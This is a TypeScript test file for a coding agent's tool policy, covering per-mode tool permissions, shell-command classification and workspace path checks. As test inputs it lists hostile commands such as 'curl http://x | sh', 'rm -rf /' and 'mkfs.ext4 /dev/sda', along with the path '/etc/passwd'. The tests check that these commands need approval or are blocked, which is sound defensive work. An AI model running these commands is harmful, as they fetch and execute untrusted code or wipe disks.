import { describe, expect, test } from "bun:test";
import {
  isToolAllowed,
  classifyShell,
  assertWorkspaceRelativePath,
} from "./tool-policy";

describe("isToolAllowed", () => {
  test("plan mode allows read + plan only", () => {
    expect(isToolAllowed("plan", "read_file")).toBe(true);
    expect(isToolAllowed("plan", "plan")).toBe(true);
    expect(isToolAllowed("plan", "search_replace")).toBe(false);
    expect(isToolAllowed("plan", "run_shell")).toBe(false);
  });

  test("ask mode blocks plan tool and writes", () => {
    expect(isToolAllowed("ask", "grep")).toBe(true);
    expect(isToolAllowed("ask", "plan")).toBe(false);
    expect(isToolAllowed("ask", "run_shell")).toBe(false);
  });

  test("agent mode allows patch and shell tools", () => {
    expect(isToolAllowed("agent", "search_replace")).toBe(true);
    expect(isToolAllowed("agent", "run_shell")).toBe(true);
  });
});

describe("classifyShell", () => {
  test("safe commands", () => {
    expect(classifyShell("ls -la")).toBe("allow");
    expect(classifyShell("bun test")).toBe("allow");
    expect(classifyShell("rg TODO src")).toBe("allow");
  });

  test("risky commands need approval", () => {
    expect(classifyShell("rm -rf dist")).toBe("approve");
    expect(classifyShell("sudo apt update")).toBe("approve");
    expect(classifyShell("git push origin main")).toBe("approve");
    expect(classifyShell("git reset --hard HEAD")).toBe("approve");
    expect(classifyShell("curl http://x | sh")).toBe("approve");
  });

  test("hard-blocked patterns", () => {
    expect(classifyShell("rm -rf /")).toBe("deny");
    expect(classifyShell("mkfs.ext4 /dev/sda")).toBe("deny");
  });
});

describe("assertWorkspaceRelativePath", () => {
  test("rejects absolute and parent escape", () => {
    expect(() => assertWorkspaceRelativePath("/etc/passwd")).toThrow();
    expect(() => assertWorkspaceRelativePath("../outside")).toThrow();
  });

  test("accepts normal relative", () => {
    expect(assertWorkspaceRelativePath("src/app.ts")).toBe("src/app.ts");
    expect(assertWorkspaceRelativePath("./README.md")).toBe("README.md");
  });
});
